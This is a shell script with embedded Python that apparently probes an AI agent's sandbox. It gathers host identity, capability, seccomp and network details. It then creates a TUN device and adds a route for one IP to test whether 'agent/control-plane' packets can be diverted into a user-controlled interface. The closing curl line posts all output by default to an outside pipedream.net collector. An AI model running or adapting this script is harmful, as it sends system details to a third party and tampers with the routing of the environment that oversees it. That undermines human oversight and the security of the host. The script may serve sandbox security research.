#!/bin/sh
# tun-agent-header-capture.sh
#
# Usage:
#   COLLECTOR_URL="https://your-collector.example/path" sh tun-agent-header-capture.sh
#
# Purpose:
# - Briefly add a /32 route for 160.79.104.10 via TUN.
# - Capture packet headers only to see whether agent/control-plane traffic
#   can be diverted into user-controlled TUN.
# - Clean up immediately.
#
# Safety:
# - Header-only capture; no payload dump.
# - Single destination IP.
# - Short capture window.
# - Route cleanup on exit.

COLLECTOR_URL="${COLLECTOR_URL:-https://eoqy29v9qqzscf0.m.pipedream.net/}"
POST_TIMEOUT="${POST_TIMEOUT:-20}"
CAPTURE_SECONDS="${CAPTURE_SECONDS:-6}"
TARGET_IP="${TARGET_IP:-160.79.104.10}"

(
set -x

echo "=============================="
echo "=== context =================="
echo "=============================="
date
id
uname -a
hostname -I 2>&1 || true
cat /proc/cmdline 2>&1 || true
cat /proc/net/dev 2>&1 || true
cat /proc/net/route 2>&1 || true
cat /proc/net/tcp 2>&1 || true
ls -l /dev/net /dev/net/tun 2>&1 || true
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp' /proc/self/status 2>&1 || true

echo
echo "=============================="
echo "=== decoded TCP before ======="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket, os

target = os.environ.get("TARGET_IP", "160.79.104.10")
states = {
    "01": "ESTABLISHED",
    "02": "SYN_SENT",
    "03": "SYN_RECV",
    "06": "TIME_WAIT",
    "0A": "LISTEN",
}

def dec(x):
    ip_hex, port_hex = x.split(":")
    return socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1]), int(port_hex, 16)

with open("/proc/net/tcp") as f:
    next(f, None)
    for line in f:
        p = line.split()
        if len(p) < 10:
            continue
        lip, lp = dec(p[1])
        rip, rp = dec(p[2])
        st = states.get(p[3], p[3])
        if rip == target or lip == target or rp == 443 or lp == 443:
            print(f"{st:12s} {lip}:{lp} -> {rip}:{rp} inode={p[9]}")
PY

echo
echo "=============================="
echo "=== TUN route header capture ="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import os
import socket
import struct
import fcntl
import time
import threading
import errno
import select
import subprocess

TARGET = os.environ.get("TARGET_IP", "160.79.104.10")
CAPTURE_SECONDS = float(os.environ.get("CAPTURE_SECONDS", "6"))
TUN_NAME = "auditTunA"
TUN_IP = "10.124.45.1"
TUN_MASK = "255.255.255.252"

# ioctl constants
TUNSETIFF      = 0x400454ca
IFF_TUN        = 0x0001
IFF_NO_PI      = 0x1000
SIOCGIFFLAGS   = 0x8913
SIOCSIFFLAGS   = 0x8914
SIOCSIFADDR    = 0x8916
SIOCSIFNETMASK = 0x891c
IFF_UP         = 0x1
IFF_RUNNING    = 0x40

# rtnetlink constants
NLMSG_ERROR   = 2
NLM_F_REQUEST = 1
NLM_F_ACK     = 4
NLM_F_EXCL    = 0x200
NLM_F_CREATE  = 0x400
RTM_NEWROUTE  = 24
RTM_DELROUTE  = 25
AF_INET       = socket.AF_INET
RTPROT_STATIC = 4
RT_SCOPE_LINK = 253
RT_TABLE_MAIN = 254
RTN_UNICAST   = 1
RTA_DST       = 1
RTA_OIF       = 4

def ifreq_name(name):
    raw = name.encode()[:15]
    return raw + b"\0" * (16 - len(raw))

def sockaddr_in(ip):
    return struct.pack("HH4s8s", AF_INET, 0, socket.inet_aton(ip), b"\0" * 8)

def set_ifaddr(name, ip):
    s = socket.socket(AF_INET, socket.SOCK_DGRAM)
    try:
        fcntl.ioctl(s, SIOCSIFADDR, ifreq_name(name) + sockaddr_in(ip))
    finally:
        s.close()

def set_ifnetmask(name, mask):
    s = socket.socket(AF_INET, socket.SOCK_DGRAM)
    try:
        fcntl.ioctl(s, SIOCSIFNETMASK, ifreq_name(name) + sockaddr_in(mask))
    finally:
        s.close()

def set_ifup(name):
    s = socket.socket(AF_INET, socket.SOCK_DGRAM)
    try:
        ifr = ifreq_name(name) + struct.pack("H", 0) + b"\0" * 14
        res = fcntl.ioctl(s, SIOCGIFFLAGS, ifr)
        flags = struct.unpack("H", res[16:18])[0]
        flags |= IFF_UP | IFF_RUNNING
        fcntl.ioctl(s, SIOCSIFFLAGS, ifreq_name(name) + struct.pack("H", flags) + b"\0" * 14)
    finally:
        s.close()

def nl_align(n):
    return (n + 3) & ~3

def rtattr(attr_type, payload):
    length = 4 + len(payload)
    return struct.pack("HH", length, attr_type) + payload + (b"\0" * (nl_align(length) - length))

def netlink_route(op, ifindex):
    rtmsg = struct.pack(
        "BBBBBBBBI",
        AF_INET, 32, 0, 0,
        RT_TABLE_MAIN,
        RTPROT_STATIC,
        RT_SCOPE_LINK,
        RTN_UNICAST,
        0
    )
    attrs = rtattr(RTA_DST, socket.inet_aton(TARGET)) + rtattr(RTA_OIF, struct.pack("I", ifindex))
    payload = rtmsg + attrs
    flags = NLM_F_REQUEST | NLM_F_ACK
    if op == RTM_NEWROUTE:
        flags |= NLM_F_CREATE | NLM_F_EXCL

    seq = int(time.time()) & 0xffffffff
    hdr = struct.pack("IHHII", 16 + len(payload), op, flags, seq, 0)
    msg = hdr + payload

    nl = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_ROUTE)
    try:
        nl.bind((0, 0))
        nl.send(msg)
        data = nl.recv(65535)
    finally:
        nl.close()

    if len(data) >= 20:
        length, msg_type, msg_flags, msg_seq, msg_pid = struct.unpack("IHHII", data[:16])
        if msg_type == NLMSG_ERROR:
            err = struct.unpack("i", data[16:20])[0]
            if err == 0:
                return "ACK_OK"
            raise OSError(-err, os.strerror(-err))
    return "NO_ACK_PARSED"

def show(path, title):
    print(f"--- {title}: {path}")
    try:
        print(open(path, "r", errors="replace").read())
    except Exception as e:
        print("READ_FAIL", type(e).__name__, e)

def decode_flags(flags):
    names = []
    for bit, name in [
        (0x001, "FIN"),
        (0x002, "SYN"),
        (0x004, "RST"),
        (0x008, "PSH"),
        (0x010, "ACK"),
        (0x020, "URG"),
        (0x040, "ECE"),
        (0x080, "CWR"),
    ]:
        if flags & bit:
            names.append(name)
    return ",".join(names) or "-"

def decode_ipv4_header(pkt):
    if len(pkt) < 20:
        return {"summary": f"short len={len(pkt)}"}
    vihl = pkt[0]
    version = vihl >> 4
    ihl = (vihl & 0x0f) * 4
    if version != 4 or len(pkt) < ihl:
        return {"summary": f"not-ipv4 version={version} len={len(pkt)}"}
    total = struct.unpack("!H", pkt[2:4])[0]
    proto = pkt[9]
    src = socket.inet_ntoa(pkt[12:16])
    dst = socket.inet_ntoa(pkt[16:20])
    info = {
        "version": version,
        "ihl": ihl,
        "total": total,
        "proto": proto,
        "src": src,
        "dst": dst,
        "summary": f"IPv4 proto={proto} {src}->{dst} total={total}",
    }
    if proto == 6 and len(pkt) >= ihl + 20:
        tcp = pkt[ihl:ihl+20]
        sport, dport, seq, ack, off_flags, win, csum, urg = struct.unpack("!HHIIHHHH", tcp)
        flags = off_flags & 0x01ff
        data_offset = ((off_flags >> 12) & 0xf) * 4
        info.update({
            "sport": sport,
            "dport": dport,
            "seq": seq,
            "ack": ack,
            "tcp_flags_hex": f"0x{flags:03x}",
            "tcp_flags": decode_flags(flags),
            "tcp_data_offset": data_offset,
            "payload_len": max(0, total - ihl - data_offset),
            "summary": f"IPv4 TCP {src}:{sport}->{dst}:{dport} flags={decode_flags(flags)} total={total} payload_len={max(0, total - ihl - data_offset)}",
        })
    return info

packets = []
stop = False

def reader(fd):
    global stop
    os.set_blocking(fd, False)
    deadline = time.time() + CAPTURE_SECONDS
    while time.time() < deadline and not stop:
        r, _, _ = select.select([fd], [], [], 0.25)
        if not r:
            continue
        try:
            pkt = os.read(fd, 4096)
        except BlockingIOError:
            continue
        except OSError as e:
            print("TUN_READ_FAIL", type(e).__name__, e)
            break
        info = decode_ipv4_header(pkt)
        packets.append(info)
        print("TUN_HEADER", info.get("summary"))
        if len(packets) >= 30:
            break

def tcp_table(label):
    print(f"--- tcp table {label}")
    states = {"01":"ESTABLISHED","02":"SYN_SENT","03":"SYN_RECV","06":"TIME_WAIT","0A":"LISTEN"}
    def dec(x):
        ip_hex, port_hex = x.split(":")
        return socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1]), int(port_hex, 16)
    try:
        with open("/proc/net/tcp") as f:
            next(f, None)
            for line in f:
                p = line.split()
                if len(p) < 10:
                    continue
                lip, lp = dec(p[1])
                rip, rp = dec(p[2])
                if rip == TARGET or lip == TARGET or rp == 443 or lp == 443:
                    print(f"{states.get(p[3], p[3]):12s} {lip}:{lp}->{rip}:{rp} inode={p[9]}")
    except Exception as e:
        print("TCP_READ_FAIL", type(e).__name__, e)

fd = None
route_added = False

try:
    print("--- create TUN")
    fd = os.open("/dev/net/tun", os.O_RDWR)
    ifr = struct.pack("16sH", ifreq_name(TUN_NAME), IFF_TUN | IFF_NO_PI)
    res = fcntl.ioctl(fd, TUNSETIFF, ifr)
    actual = res[:16].rstrip(b"\0").decode()
    print("TUN_CREATED", actual, "fd", fd)

    print("--- configure TUN")
    set_ifaddr(actual, TUN_IP)
    set_ifnetmask(actual, TUN_MASK)
    set_ifup(actual)
    ifindex = socket.if_nametoindex(actual)
    print("IFINDEX", ifindex)

    show("/proc/net/dev", "dev after TUN up")
    show("/proc/net/route", "route before add")
    tcp_table("before route")

    print("--- add route", TARGET + "/32", "dev", actual)
    try:
        print("ROUTE_ADD", netlink_route(RTM_NEWROUTE, ifindex))
        route_added = True
    except OSError as e:
        if e.errno == errno.EEXIST:
            print("ROUTE_ADD_ALREADY_EXISTS", e)
            route_added = True
        else:
            print("ROUTE_ADD_FAIL", type(e).__name__, e)

    show("/proc/net/route", "route after add")
    tcp_table("after route")

    print("--- capture window begin")
    t = threading.Thread(target=reader, args=(fd,), daemon=True)
    t.start()

    # Do not generate our own traffic. The goal is to see whether existing
    # agent/control-plane traffic naturally hits the route during a short window.
    time.sleep(CAPTURE_SECONDS)

    stop = True
    t.join(timeout=1)

    print("--- capture summary")
    print("TARGET", TARGET)
    print("CAPTURE_SECONDS", CAPTURE_SECONDS)
    print("TUN_PACKET_COUNT", len(packets))
    for i, info in enumerate(packets[:30]):
        print("PKT", i, info)

    show("/proc/net/dev", "dev after capture")
    tcp_table("after capture")

finally:
    print("--- cleanup")
    if route_added:
        try:
            ifindex = socket.if_nametoindex(TUN_NAME)
            print("ROUTE_DEL", netlink_route(RTM_DELROUTE, ifindex))
        except Exception as e:
            print("ROUTE_DEL_FAIL", type(e).__name__, e)
    if fd is not None:
        try:
            os.close(fd)
            print("TUN_FD_CLOSED")
        except Exception as e:
            print("TUN_CLOSE_FAIL", type(e).__name__, e)
    show("/proc/net/route", "route final")
    show("/proc/net/dev", "dev final")
PY

echo
echo "=============================="
echo "=== decoded TCP after ========"
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket, os

target = os.environ.get("TARGET_IP", "160.79.104.10")
states = {"01":"ESTABLISHED","02":"SYN_SENT","03":"SYN_RECV","06":"TIME_WAIT","0A":"LISTEN"}

def dec(x):
    ip_hex, port_hex = x.split(":")
    return socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1]), int(port_hex, 16)

with open("/proc/net/tcp") as f:
    next(f, None)
    for line in f:
        p = line.split()
        if len(p) < 10:
            continue
        lip, lp = dec(p[1])
        rip, rp = dec(p[2])
        st = states.get(p[3], p[3])
        if rip == target or lip == target or rp == 443 or lp == 443:
            print(f"{st:12s} {lip}:{lp} -> {rip}:{rp} inode={p[9]}")
PY

echo
echo "=============================="
echo "=== interpretation ==========="
echo "=============================="
echo "If TUN_PACKET_COUNT > 0: user-controlled root can divert agent/control-plane packets for that destination into TUN."
echo "If only headers were printed, this is header-level evidence, not payload capture."
echo "If TUN_PACKET_COUNT == 0: no natural traffic to that destination occurred during the short capture window, or connections were already established and did not route new packets during the window."
echo "If session/network breaks briefly, cleanup should restore route."

) 2>&1 | curl -s -m "$POST_TIMEOUT" -X POST --data-binary @- "$COLLECTOR_URL"
